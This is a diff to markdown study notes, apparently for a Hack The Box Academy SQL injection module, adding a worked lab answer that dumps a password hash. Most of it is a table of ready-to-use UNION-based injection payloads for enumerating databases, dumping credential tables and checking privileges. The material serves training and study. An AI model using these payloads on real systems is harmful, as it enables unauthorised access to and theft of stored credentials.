@@ -97,19 +97,36 @@ FROM
 | --------------|-------------------|
 | **Union Injection** | [Methodology of SQL Injection with UNION, from detecting number of columns to locating of injection](https://academy.hackthebox.com/module/33/section/216) |
 | `' order by 1-- -` | Detect number of columns using `order by` |
-| `cn' UNION select 1,2,3-- -` | Detect number of columns using Union injection [Union Clause - Columns](https://academy.hackthebox.com/module/33/section/806) |
-| `cn' UNION select 1,@@version,3,4-- -` | Basic Union injection |
+| `cn' UNION select 1,2,3-- -` | Detect number of columns using Union injection. Reminder: We are adding an extra dash (-) at the end, to show you that there is a space after (--). [Union Clause - Columns](https://academy.hackthebox.com/module/33/section/806) |
+| `cn' UNION select 1,@@version,3,4-- -` | Basic Union injection, Reminder: We are adding an extra dash (-) at the end, to show you that there is a space after (--). |
 | `UNION select username, 2, 3, 4 from passwords-- -` | Union injection for 4 columns |
 | **DB Enumeration** |
-| `SELECT @@version` | Fingerprint MySQL with query output |
+| `SELECT @@version` | Fingerprint MySQL with query output [Database Enumeration](https://academy.hackthebox.com/module/33/section/217) |
 | `SELECT SLEEP(5)` | Fingerprint MySQL with no output |
 | `cn' UNION select 1,database(),2,3-- -` | Current database name |
 | `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -` | List all databases |
 | `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -` | List all tables in a specific database |
 | `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -` | List all columns in a specific table |
 | `cn' UNION select 1, username, password, 4 from dev.credentials-- -` | Dump data from a table in another database |
+
+>What is the password hash for 'newuser' stored in the 'users' table in the 'ilfreight' database?  
+
+```
+cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='users'-- -
+```  
+
+>Placing the database name infront of the table name, `ilfreight.users` to extract the specific columns `username,password`.  
+```
+cn' UNION select 1,username,password,4 from ilfreight.users-- -
+```  
+
+![sqli-data-extract](/images/sqli-data-extract.png)  
+
+
+| **Payload**   | **Description**   |
+| --------------|-------------------|
 | **Privileges** |
-| `cn' UNION SELECT 1, user(), 3, 4-- -` | Find current user |
+| `cn' UNION SELECT 1, user(), 3, 4-- -` | Find current user running SQL service queries on web application. [Union Injection](https://academy.hackthebox.com/module/33/section/216) |
 | `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -` | Find if user has admin privileges |
 | `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE user="root"-- -` | Find if all user privileges |
 | `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -` | Find which directories can be accessed through MySQL |
